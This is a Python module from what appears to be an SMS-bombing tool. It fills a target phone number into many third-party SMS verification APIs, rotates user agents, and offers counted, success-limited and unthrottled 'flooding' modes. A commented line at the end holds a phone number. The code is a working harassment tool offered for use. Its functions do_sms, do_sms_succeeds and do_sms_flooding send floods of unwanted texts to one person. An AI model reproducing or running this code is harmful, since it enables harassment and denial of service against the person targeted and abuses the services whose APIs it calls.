import requests
import json
import random
import os
import threading
import time
from utils.log import logger
from factory import AIPModel
from typing import Union

succeed_cnt = 0
max_tried = 100
tried_cnt = 0

lock = threading.Lock()


def random_user_agent(file_path: str = 'headers.json'):
    if os.path.isfile(file_path):
        with open(file_path, 'r') as headers_json:
            headers = json.loads(headers_json.read())
            return random.choice(headers)
    else:
        logger.warning('headers.json not found. Fetching data form github.')
        # chunk is so large
        return random.choice(requests.get('https://github.com/dhay3/woodpecker/blob/master/woodpecker/headers.json',
                                          timeout=10)
                             .json())


def check_response(api: AIPModel, resp: Union[requests.Response, None]):
    return True if resp and api.identifier in resp.text else False


def do_request(api: AIPModel):
    try:
        if 'GET' == api.method:
            return requests.request(url=api.url,
                                    method=api.method,
                                    headers=json.loads(api.header),
                                    params=api.data,
                                    timeout=5)
        elif 'POST' == api.method:
            return requests.request(url=api.url,
                                    method=api.method,
                                    headers=json.loads(api.header),
                                    data=api.data,
                                    timeout=5)
        else:
            raise Exception('Method not supported, check aipdata.json.')
    except Exception as e:
        logger.error(e.__str__())


def do_request_no_reply(api: AIPModel):
    resp = do_request(api)


def do_request_reply(api: AIPModel):
    resp = do_request(api)
    if check_response(api, resp):
        logger.success(f'{api.desc} succeed.')
        return True
    else:
        logger.warning(f'{api.desc} failed.')
        return False


def do_sms_check(phone: str, _api: [AIPModel]):
    global succeed_cnt
    total_api = len(_api)
    for idx in range(len(_api)):
        api = _api[idx].copy()
        api.api_bean(phone)
        if do_request_reply(api):
            succeed_cnt += 1
    logger.info(f'total: {len(_api)}, passed: {succeed_cnt},ratio: {succeed_cnt / total_api * 100}%')


def do_sms(phone: str, count: int, interval: int, _api: [AIPModel]):
    global tried_cnt
    for api in _api:
        lock.acquire()
        if tried_cnt < count:
            api = api.copy()
            api.api_bean(phone)
            do_request_reply(api)
            if interval:
                time.sleep(interval)
        tried_cnt += 1
        lock.release()


def do_sms_succeeds(phone: str, count: int, interval: int, max_limit, _api: [AIPModel]):
    global succeed_cnt
    global tried_cnt
    for api in _api:
        lock.acquire()
        if succeed_cnt < count and tried_cnt < max_limit:
            api = api.copy()
            api.api_bean(phone)
            if do_request_reply(api):
                succeed_cnt += 1
            if interval:
                time.sleep(interval)
        tried_cnt += 1
        lock.release()


def do_sms_flooding(phone: str, _api: [AIPModel]):
    for api in _api:
        api = api.copy()
        api.api_bean(phone)
        do_request_no_reply(api)


if __name__ == '__main__':
    pass
    # do_sms_onerun('15988803859')
